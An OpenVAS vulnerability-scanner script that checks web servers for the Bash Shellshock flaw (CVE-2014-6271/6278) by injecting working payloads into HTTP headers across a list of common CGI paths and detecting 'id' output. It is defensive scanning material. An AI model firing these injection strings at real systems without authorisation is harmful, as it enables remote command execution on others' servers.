###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bash_shellshock_remote_cmd_exec_vuln.nasl 14236 2019-03-17 10:54:12Z cfischer $
#
# GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804489");
  script_version("$Revision: 14236 $");
  script_cve_id("CVE-2014-6271", "CVE-2014-6278");
  script_bugtraq_id(70103);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-03-17 11:54:12 +0100 (Sun, 17 Mar 2019) $");
  script_tag(name:"creation_date", value:"2014-09-25 18:47:16 +0530 (Thu, 25 Sep 2014)");
  script_name("GNU Bash Environment Variable Handling Shell Remote Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_add_preference(name:"Shellshock: Check CGIs in KB:", type:"checkbox", value:"no");

  script_xref(name:"URL", value:"https://access.redhat.com/solutions/1207723");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=1141597");
  script_xref(name:"URL", value:"https://blogs.akamai.com/2014/09/environment-bashing.html");
  script_xref(name:"URL", value:"https://community.qualys.com/blogs/securitylabs/2014/09/24/");
  script_xref(name:"URL", value:"http://www.gnu.org/software/bash/");

  script_tag(name:"summary", value:"This host is installed with GNU Bash Shell
  and is prone to remote command execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted command via HTTP GET
  request and check remote command execution.");

  script_tag(name:"insight", value:"GNU bash contains a flaw that is triggered
  when evaluating environment variables passed from another environment.
  After processing a function definition, bash continues to process trailing
  strings.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  or local attackers to inject  shell commands, allowing local privilege
  escalation or remote command execution depending on the application vector.");

  script_tag(name:"affected", value:"GNU Bash through 4.3");

  script_tag(name:"solution", value:"Apply the patch or upgrade to latest version.");

  script_timeout(600);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");

cgis = make_list();
cgis[i++] = '/';
cgis[i++] = '/cgi-bin/authLogin.cgi';
cgis[i++] = '/cgi-bin/restore_config.cgi';
cgis[i++] = '/cgi-bin/index.cgi';
cgis[i++] = '/dasdec/dasdec.csp';
cgis[i++] = '/status';
cgis[i++] = '/cgi-bin/status';
cgis[i++] = '/index.php';
cgis[i++] = '/login.php';
cgis[i++] = '/test.cgi.php';
cgis[i++] = '/test_cgi.php';
cgis[i++] = '/cgi-bin/server.php';
cgis[i++] = '/index.pl';
cgis[i++] = '/login.pl';
cgis[i++] = '/test.cgi.pl';
cgis[i++] = '/test_cgi.pl';
cgis[i++] = '/test.cgi';
cgis[i++] = '/cgi-bin/php.fcgi';
cgis[i++] = '/cgi-bin/info.sh';
cgis[i++] = '/cgi-bin/info.cgi';
cgis[i++] = '/cgi-bin/env.cgi';
cgis[i++] = '/cgi-bin/environment.cgi';
cgis[i++] = '/cgi-bin/test.sh';
cgis[i++] = '/cgi-bin/test';
cgis[i++] = '/cgi-bin/php';
cgis[i++] = '/cgi-bin/php5';
cgis[i++] = '/cgi-sys/php5';
cgis[i++] = '/cgi-bin/php-cgi';
cgis[i++] = '/cgi-bin/printenv';
cgis[i++] = '/cgi-bin/php.cgi';
cgis[i++] = '/cgi-bin/php4';
cgis[i++] = '/cgi-bin/test-cgi';
cgis[i++] = '/cgi-bin/test.cgi';
cgis[i++] = '/cgi-bin/test.cgi.pl';
cgis[i++] = '/cgi-bin/test-cgi.pl';
cgis[i++] = '/cgi-bin/cgiinfo.cgi';
cgis[i++] = '/cgi-bin/login.cgi';
cgis[i++] = '/cgi-bin/test.cgi.php';
cgis[i++] = '/cgi-sys/entropysearch.cgi';
cgis[i++] = '/cgi-sys/defaultwebpage.cgi';
cgis[i++] = '/cgi-sys/FormMail-clone.cgi';
cgis[i++] = '/cgi-bin/search';
cgis[i++] = '/cgi-bin/search.cgi';
cgis[i++] = '/cgi-bin/whois.cgi';
cgis[i++] = '/cgi-bin/viewcvs.cgi';
cgis[i++] = '/cgi-mod/index.cgi';
cgis[i++] = '/cgi-bin/test.py';
cgis[i++] = '/cgi-bin/cgitest.py';
cgis[i++] = '/cgi-bin/ruby.rb';
cgis[i++] = '/cgi-bin/ezmlm-browse';
cgis[i++] = '/cgi-bin-sdb/printenv';
cgis[i++] = '/cgi-bin/welcome';
cgis[i++] = '/cgi-bin/helpme';
cgis[i++] = '/cgi-bin/his';
cgis[i++] = '/cgi-bin/hi';
cgis[i++] = '/cgi_wrapper';
cgis[i++] = '/admin.cgi';
cgis[i++] = '/administrator.cgi';
cgis[i++] = '/cgi-bin/guestbook.cgi';
cgis[i++] = '/tmUnblock.cgi';
cgis[i++] = '/phppath/php';
cgis[i++] = '/cgi-bin/sysinfo.pl';
cgis[i++] = '/cgi-bin/pathtest.pl';
cgis[i++] = '/cgi-bin/contact.cgi';
cgis[i++] = '/cgi-bin/uname.cgi';

function _check( url, port, host, useragent, vt_string ) {

  local_var url, port, host, useragent, vt_string;
  local_var attacks, attack, method, http_field, req, res, uid, report;

  attacks = make_list( '() { ' + vt_string + ':; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;',
                       '() { _; ' + vt_string + '; } >_[$($())] { echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }' );

  foreach attack( attacks ) {
    foreach method( make_list( "GET", "POST") ) {
      foreach http_field( make_list( "User-Agent: ", "Referer: ", "Cookie: ", vt_string + ": " ) ) {

        req = string( method, " ", url, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n" );

        if( "User-Agent" >!< http_field )
          req += string( "User-Agent: ", useragent, "\r\n" );

        req += string( http_field, attack, "\r\n",
                       "Connection: close\r\n",
                       "Accept: */*\r\n\r\n" );
        res = http_send_recv( port:port, data:req );

        if( res && res =~ "uid=[0-9]+\(.*gid=[0-9]+\(.*" ) {
          uid = eregmatch( pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:res );

          report = 'By requesting the URL "' + url + '" with the "' + http_field + '" header set to\n"' +
                   attack + '"\nit was possible to execute the "id" command.\n\nResult: ' + uid[1];
          expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
          security_message( port:port, data:report, expert_info:expert_info );
          exit( 0 );
        }
      }
    }
  }
}

function add_files( extensions ) {

  local_var extensions;
  local_var ext, known, e, x;

  foreach ext( extensions ) {
    known = FALSE;

    if( "-" >< ext ) {
      e = split( ext, sep:" - ", keep:FALSE );
      if( isnull( e[0] ) )
        continue;
      ext = e[0];
      ext = chomp( ext );
    }

    for( x = 0; x < max_index( cgis ); x++ ) {
      if( ext == cgis[x])
        known = TRUE;
    }

    if( ereg( pattern:"\.(js|css|gif|png|jpeg|jpg|pdf|ico)$", string:tolower( ext ) ) )
      continue;

    if( ! known )
      cgis[i++] = ext;
  }
}

check_kb_cgis = script_get_preference( "Shellshock: Check CGIs in KB:" );

port = get_http_port( default:80 );

if( check_kb_cgis == "yes" ) {
  # nb: This is expected to be here, we're using the same call later to add the port to the host header...
  host = http_host_name( dont_add_port:TRUE );
  extensions = http_get_kb_file_extensions( port:port, host:host, ext:"*" );
  if( extensions )
    add_files( extensions:extensions );

  kb_cgis = http_get_kb_cgis( port:port, host:host );
  if( kb_cgis )
    add_files( extensions:kb_cgis );
}

useragent = http_get_user_agent();
vtstrings = get_vt_strings();
vt_string = vtstrings["default"];
host = http_host_name( port:port );

foreach dir( cgis ) {
  _check( url:dir, port:port, host:host, useragent:useragent, vt_string:vt_string );
}

exit( 99 );